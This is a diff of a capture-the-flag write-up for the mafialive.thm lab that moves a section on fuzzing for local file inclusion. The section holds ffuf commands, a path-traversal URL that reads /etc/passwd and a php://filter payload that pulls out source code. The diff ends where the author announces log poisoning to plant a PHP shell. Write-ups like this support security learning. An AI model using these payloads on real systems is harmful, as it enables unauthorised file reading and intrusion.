@@ -48,22 +48,6 @@ Let's click that button.
 Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`
 
 
-
-Let's fuzz for LFI:
-`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`
-
-Only to find out many false positives.
-
-Let's try filtering through size and words:
-`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
-![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
-We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate `/etc/passwd`
-
-`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
-![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)
-
-
-
 Let's try a php filter to exfiltrate data:
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
 ![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)
@@ -81,6 +65,20 @@ Let's do it with the entire test.php page:
 And decode the exfiltrated data to find the second flag:
 ![](https://github.com/user-attachments/assets/c4f9ca9d-1c6b-4984-b96a-97d6b36083b3)
 
+
+
+Let's fuzz for LFI:
+`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`
+
+Only to find out many false positives.
+
+Let's try filtering through size and words:
+`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
+![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
+We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate `/etc/passwd`
+
+`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
+![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)
 
 
 Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
